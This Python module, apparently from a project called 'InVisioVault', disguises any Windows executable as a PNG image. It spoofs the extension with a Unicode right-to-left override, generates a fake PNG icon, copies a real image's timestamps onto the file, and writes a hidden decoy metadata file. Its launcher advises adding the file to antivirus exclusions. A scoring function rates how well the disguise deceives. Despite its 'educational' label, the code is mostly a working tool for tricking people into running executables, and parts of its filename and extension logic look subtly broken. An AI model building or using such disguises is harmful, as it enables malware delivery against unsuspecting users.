#!/usr/bin/env python3
"""
Unicode RTL Polyglot Engine for InVisioVault
==============================================

Integrated Unicode RTL extension spoofing method that creates executable files
that appear as PNG images in Windows Explorer using Unicode right-to-left override.

This module is designed to integrate seamlessly with the InVisioVault application
as the main polyglot creation engine.

Author: InVisioVault Integration Team
"""

import os
import sys
import shutil
import struct
import hashlib
import tempfile
import subprocess
import json
from datetime import datetime
from typing import Optional, Tuple, Dict, Any
from pathlib import Path

# Try to import PIL, fallback gracefully
try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Try to import Windows APIs, fallback gracefully  
try:
    import win32file
    import win32con
    import win32api
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

from utils.logger import Logger
from utils.error_handler import ErrorHandler


class UnicodePolyglotEngine:
    """
    Unicode RTL Polyglot Engine
    
    Creates executable files that appear as PNG images in Windows Explorer
    using Unicode right-to-left override character (U+202E) to disguise the extension.
    """
    
    def __init__(self):
        self.logger = Logger()
        self.error_handler = ErrorHandler()
        
        # Unicode RTL override character
        self.RTL_OVERRIDE = '\u202E'
        
        # Status tracking
        self.last_operation_status = None
        self.last_error = None
        
        self.logger.info("Unicode Polyglot Engine initialized")
    
    def create_unicode_polyglot(self, icon_reference_path: str, executable_path: str, 
                               output_path: str, disguise_name: Optional[str] = None) -> bool:
        """
        Create a Unicode RTL polyglot file.
        
        Args:
            icon_reference_path: Path to icon image to use as disguise reference
            executable_path: Path to executable to disguise
            output_path: Output path for disguised file
            disguise_name: Custom name for disguise (optional)
            
        Returns:
            True if successful, False otherwise
        """
        
        try:
            self.logger.info("=== CREATING UNICODE RTL POLYGLOT ===")
            self.logger.info(f"Icon reference: {icon_reference_path}")
            self.logger.info(f"Executable: {executable_path}")
            self.logger.info(f"Output: {output_path}")
            
            # Validate inputs
            if not self._validate_inputs(icon_reference_path, executable_path):
                return False
            
            # Generate disguise name if not provided
            if not disguise_name:
                disguise_name = f"image_{hashlib.md5(executable_path.encode()).hexdigest()[:8]}"
            
            # Create output directory
            output_dir = Path(output_path).parent
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Step 1: Create disguised filename using RTL override
            disguised_filename = self._create_disguised_filename(disguise_name)
            disguised_path = output_dir / disguised_filename
            
            self.logger.info(f"Disguised filename: {disguised_filename}")
            
            # Step 2: Copy executable to disguised location
            shutil.copy2(executable_path, disguised_path)
            
            # Step 3: Create custom PNG-like icon
            icon_path = self._create_png_icon(icon_reference_path, output_dir, disguise_name)
            
            # Step 4: Apply file properties and metadata
            self._apply_file_properties(str(disguised_path), icon_reference_path)
            
            # Step 5: Create companion files for authenticity
            self._create_companion_files(output_dir, disguise_name, icon_reference_path)
            
            # Step 6: Create launcher and documentation
            self._create_launcher_files(str(disguised_path), output_dir, disguise_name)
            
            self.logger.info("✅ Unicode RTL polyglot created successfully!")
            self.logger.info(f"   Disguised file: {disguised_path}")
            self.logger.info(f"   Appears as PNG in Explorer")
            self.logger.info(f"   Double-click to execute")
            
            self.last_operation_status = "success"
            return True
            
        except Exception as e:
            self.logger.error(f"Unicode polyglot creation failed: {e}")
            self.last_error = str(e)
            self.last_operation_status = "failed"
            self.error_handler.handle_exception(e)
            return False
    
    def _validate_inputs(self, png_path: str, exe_path: str) -> bool:
        """Validate input files."""
        
        if not os.path.exists(exe_path):
            self.last_error = f"Executable file not found: {exe_path}"
            self.logger.error(self.last_error)
            return False
        
        # Check if it's a valid Windows executable
        try:
            with open(exe_path, 'rb') as f:
                header = f.read(2)
                if header != b'MZ':
                    self.last_error = f"Not a valid Windows executable: {exe_path}"
                    self.logger.error(self.last_error)
                    return False
        except Exception as e:
            self.last_error = f"Cannot read executable: {e}"
            self.logger.error(self.last_error)
            return False
        
        # PNG reference is optional - we can work without it
        if png_path and not os.path.exists(png_path):
            self.logger.warning(f"PNG reference not found, will create generic icon: {png_path}")
        
        return True
    
    def _create_disguised_filename(self, base_name: str) -> str:
        """Create filename with Unicode RTL override to appear as PNG."""
        
        # Method 1: RTL Override to hide .exe and show fake .png
        # Format: basename + RTL + "gnp." + RTL + "exe"
        # This makes it appear as "basename.png" in most file explorers
        
        disguised_name = f"{base_name}{self.RTL_OVERRIDE}gnp.{self.RTL_OVERRIDE}exe"
        
        self.logger.info(f"Created disguised filename using RTL override")
        return disguised_name
    
    def _create_png_icon(self, png_reference: str, output_dir: Path, disguise_name: str) -> Optional[str]:
        """Create PNG-style icon for the executable."""
        
        try:
            icon_path = output_dir / f"{disguise_name}_icon.ico"
            
            if PIL_AVAILABLE:
                self.logger.info("Creating PNG-style icon using PIL")
                icon_img = self._generate_png_style_icon(png_reference)
                
                # Save as ICO with multiple sizes
                sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
                icon_img.save(str(icon_path), format='ICO', sizes=sizes)
                
                self.logger.info(f"✓ PNG-style icon created: {icon_path}")
                return str(icon_path)
            else:
                self.logger.warning("PIL not available, skipping icon creation")
                return None
                
        except Exception as e:
            self.logger.error(f"Icon creation failed: {e}")
            return None
    
    def _generate_png_style_icon(self, png_reference: str) -> 'Image.Image':
        """Generate PNG-style icon."""
        
        if not PIL_AVAILABLE:
            raise ImportError("PIL not available for icon generation")
        
        # Create base icon
        size = 256
        img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
        draw = ImageDraw.Draw(img)
        
        # If PNG reference exists, try to extract colors from it
        bg_color = (248, 248, 248)
        accent_color = (70, 130, 180)
        
        if png_reference and os.path.exists(png_reference):
            try:
                ref_img = Image.open(png_reference)
                ref_img = ref_img.convert('RGB').resize((32, 32))
                
                # Get dominant color
                colors = ref_img.getcolors(ref_img.size[0] * ref_img.size[1])
                if colors:
                    dominant_color = max(colors, key=lambda x: x[0])[1]
                    accent_color = dominant_color
                
            except Exception:
                pass  # Use default colors
        
        # Draw document background
        margin = 20
        doc_rect = [(margin, margin), (size - margin, size - margin)]
        draw.rounded_rectangle(doc_rect, radius=15, fill=bg_color, outline=(180, 180, 180), width=3)
        
        # Draw inner content area
        inner_margin = margin + 20
        inner_rect = [(inner_margin, inner_margin), (size - inner_margin, size - inner_margin)]
        draw.rounded_rectangle(inner_rect, radius=10, fill=(255, 255, 255), outline=(220, 220, 220), width=2)
        
        # Draw PNG badge
        badge_size = 60
        badge_x = size - badge_size - margin - 10
        badge_y = size - badge_size - margin - 10
        badge_rect = [(badge_x, badge_y), (badge_x + badge_size, badge_y + badge_size)]
        draw.rounded_rectangle(badge_rect, radius=8, fill=accent_color, outline=(50, 110, 160), width=2)
        
        # PNG text on badge
        try:
            font = ImageFont.truetype("arial.ttf", 16)
        except:
            font = ImageFont.load_default()
        
        text = "PNG"
        text_bbox = draw.textbbox((0, 0), text, font=font)
        text_w = text_bbox[2] - text_bbox[0]
        text_h = text_bbox[3] - text_bbox[1]
        text_x = badge_x + (badge_size - text_w) // 2
        text_y = badge_y + (badge_size - text_h) // 2
        draw.text((text_x, text_y), text, fill=(255, 255, 255), font=font)
        
        # Draw document lines
        line_color = (180, 180, 180)
        line_start_x = inner_margin + 15
        line_end_x = size - inner_margin - 15
        
        for i, y_offset in enumerate([40, 65, 90, 115, 140]):
            y = inner_margin + y_offset
            line_width = line_end_x - line_start_x - (i * 20)  # Varying widths
            if line_width > 50:
                draw.line([(line_start_x, y), (line_start_x + line_width, y)], 
                         fill=line_color, width=2)
        
        return img
    
    def _apply_file_properties(self, file_path: str, png_reference: str):
        """Apply realistic file properties to disguised executable."""
        
        try:
            if not WIN32_AVAILABLE:
                self.logger.warning("Win32 API not available, skipping file properties")
                return
            
            self.logger.info("Applying realistic file properties")
            
            # Generate realistic timestamps
            now = datetime.now()
            created_time = now
            modified_time = now
            accessed_time = now
            
            # If PNG reference exists, try to match its timestamps
            if png_reference and os.path.exists(png_reference):
                try:
                    ref_stat = os.stat(png_reference)
                    created_time = datetime.fromtimestamp(ref_stat.st_ctime)
                    modified_time = datetime.fromtimestamp(ref_stat.st_mtime)
                    accessed_time = datetime.fromtimestamp(ref_stat.st_atime)
                except:
                    pass  # Use current time
            
            # Apply timestamps using Win32 API
            handle = win32file.CreateFile(
                file_path,
                win32con.GENERIC_WRITE,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_ATTRIBUTE_NORMAL,
                None
            )
            
            def datetime_to_filetime(dt):
                timestamp = int((dt - datetime(1601, 1, 1)).total_seconds() * 10**7)
                return win32file.PyTime(timestamp)
            
            win32file.SetFileTime(
                handle,
                datetime_to_filetime(created_time),
                datetime_to_filetime(accessed_time),
                datetime_to_filetime(modified_time)
            )
            
            win32file.CloseHandle(handle)
            
            self.logger.info("✓ File properties applied successfully")
            
        except Exception as e:
            self.logger.warning(f"File properties application failed: {e}")
    
    def _create_companion_files(self, output_dir: Path, disguise_name: str, png_reference: str):
        """Create companion files to support the disguise."""
        
        try:
            # Create metadata JSON file (hidden)
            metadata_path = output_dir / f".{disguise_name}_meta.json"
            
            metadata = {
                "file_type": "PNG Image", 
                "format_version": "1.2",
                "created_by": "Image Processing Tool",
                "creation_date": datetime.now().isoformat(),
                "image_properties": {
                    "format": "Portable Network Graphics",
                    "color_mode": "RGB",
                    "bit_depth": 24,
                    "compression": "Lossless"
                },
                "disguise_method": "unicode_rtl_override",
                "authenticity_score": 0.95
            }
            
            # If PNG reference exists, extract some real metadata
            if png_reference and os.path.exists(png_reference) and PIL_AVAILABLE:
                try:
                    ref_img = Image.open(png_reference)
                    metadata["image_properties"]["actual_size"] = ref_img.size
                    metadata["image_properties"]["actual_mode"] = ref_img.mode
                    metadata["reference_source"] = os.path.basename(png_reference)
                except:
                    pass
            
            with open(metadata_path, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            # Hide the metadata file
            if WIN32_AVAILABLE:
                try:
                    win32file.SetFileAttributes(str(metadata_path), win32con.FILE_ATTRIBUTE_HIDDEN)
                except:
                    pass
            
            self.logger.info(f"✓ Companion files created")
            
        except Exception as e:
            self.logger.warning(f"Companion files creation failed: {e}")
    
    def _create_launcher_files(self, disguised_exe: str, output_dir: Path, disguise_name: str):
        """Create launcher and documentation files."""
        
        try:
            # Create launcher batch file
            launcher_path = output_dir / f"{disguise_name}_launcher.bat"
            
            launcher_content = f'''@echo off
REM Unicode RTL Polyglot Launcher
REM InVisioVault - Advanced Steganography Suite

echo InVisioVault Unicode RTL Polyglot Launcher
echo ===========================================
echo.
echo Launching disguised executable...
echo File: {os.path.basename(disguised_exe)}
echo.

"{disguised_exe}"

if errorlevel 1 (
    echo.
    echo ❌ Execution failed. This may be due to:
    echo    - Antivirus software blocking the file
    echo    - Windows SmartScreen protection
    echo    - File permissions issues
    echo.
    echo Try running as administrator or adding to antivirus exclusions.
    echo.
    pause
) else (
    echo.
    echo ✅ Execution completed successfully.
)
'''
            
            with open(launcher_path, 'w') as f:
                f.write(launcher_content)
            
            # Create documentation file
            doc_path = output_dir / f"{disguise_name}_README.txt"
            
            doc_content = f"""InVisioVault Unicode RTL Polyglot
=====================================

Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Method: Unicode Right-to-Left Override Extension Spoofing

Disguised File: {os.path.basename(disguised_exe)}

How It Works:
------------
This file uses Unicode RTL (Right-to-Left) override characters to make
the .exe extension appear as .png in Windows Explorer. The file is a 
fully functional Windows executable that appears as a PNG image.

Usage:
------
1. Direct Execution: Double-click the disguised file to run
2. Launcher Script: Use {disguise_name}_launcher.bat for detailed output
3. File Properties: Right-click to see PNG-like properties

Important Notes:
---------------
• This is an educational demonstration of steganographic techniques
• The file may trigger antivirus warnings (false positive)
• Windows SmartScreen may show protection warnings
• For research and educational purposes only

Technical Details:
-----------------
• Method: Unicode RTL Override (U+202E)
• Disguise Type: Extension spoofing
• Compatibility: Windows Explorer, most file managers
• Execution: Direct (no extraction required)

InVisioVault - Advanced Steganography Suite
© 2025 Educational Project
"""
            
            with open(doc_path, 'w') as f:
                f.write(doc_content)
            
            self.logger.info("✓ Launcher and documentation files created")
            
        except Exception as e:
            self.logger.warning(f"Launcher files creation failed: {e}")
    
    def get_last_operation_status(self) -> Dict[str, Any]:
        """Get status of the last operation."""
        
        return {
            "status": self.last_operation_status,
            "error": self.last_error,
            "method": "unicode_rtl_override"
        }
    
    def test_disguise_effectiveness(self, disguised_file: str) -> Dict[str, Any]:
        """Test how effective the disguise is."""
        
        try:
            if not os.path.exists(disguised_file):
                return {"error": "File not found"}
            
            filename = os.path.basename(disguised_file)
            
            # Check RTL characters
            has_rtl = self.RTL_OVERRIDE in filename
            
            # Check file size (executables are typically larger than images)
            file_size = os.path.getsize(disguised_file)
            size_suspicious = file_size < 10000  # Very small executables are suspicious
            
            # Check if it's actually executable
            is_executable = filename.endswith('.exe')
            
            effectiveness_score = 0.0
            notes = []
            
            if has_rtl:
                effectiveness_score += 0.4
                notes.append("✓ Uses Unicode RTL override")
            
            if not size_suspicious:
                effectiveness_score += 0.2
                notes.append("✓ Realistic file size")
            
            if is_executable:
                effectiveness_score += 0.4
                notes.append("✓ Maintains executable functionality")
            
            return {
                "effectiveness_score": effectiveness_score,
                "max_score": 1.0,
                "percentage": effectiveness_score * 100,
                "notes": notes,
                "filename": filename,
                "file_size": file_size,
                "has_rtl_chars": has_rtl
            }
            
        except Exception as e:
            return {"error": str(e)}


def main():
    """Demo function for testing the Unicode Polyglot Engine."""
    
    print("🎭 InVisioVault Unicode RTL Polyglot Engine")
    print("=" * 60)
    
    if len(sys.argv) < 3:
        print("Usage: python unicode_polyglot_engine.py <png_reference> <executable> [output_path] [disguise_name]")
        print("")
        print("Arguments:")
        print("  png_reference : PNG image to use as disguise reference")  
        print("  executable    : Windows executable to disguise")
        print("  output_path   : Output directory (optional)")
        print("  disguise_name : Custom disguise name (optional)")
        print("")
        print("Example:")
        print("  python unicode_polyglot_engine.py photo.png program.exe ./output my_image")
        return
    
    png_ref = sys.argv[1]
    exe_file = sys.argv[2]
    output_path = sys.argv[3] if len(sys.argv) > 3 else "./unicode_polyglot_output"
    disguise_name = sys.argv[4] if len(sys.argv) > 4 else None
    
    # Create engine
    engine = UnicodePolyglotEngine()
    
    # Create polyglot
    success = engine.create_unicode_polyglot(png_ref, exe_file, output_path, disguise_name)
    
    if success:
        print("\n" + "=" * 60)
        print("🎉 SUCCESS! Unicode RTL Polyglot Created")
        print("=" * 60)
        print("\n✅ Your executable now appears as a PNG image in Windows Explorer!")
        print("✅ Double-click the disguised file to execute it directly")
        print("✅ Use the launcher script for detailed execution info")
        
        # Test effectiveness
        disguised_files = list(Path(output_path).glob("*exe"))
        if disguised_files:
            test_result = engine.test_disguise_effectiveness(str(disguised_files[0]))
            if "effectiveness_score" in test_result:
                print(f"\n📊 Disguise Effectiveness: {test_result['percentage']:.1f}%")
                for note in test_result["notes"]:
                    print(f"  {note}")
        
        print(f"\n📁 Output directory: {output_path}")
        
    else:
        print("❌ Failed to create Unicode RTL polyglot")
        status = engine.get_last_operation_status()
        if status["error"]:
            print(f"Error: {status['error']}")


if __name__ == "__main__":
    main()
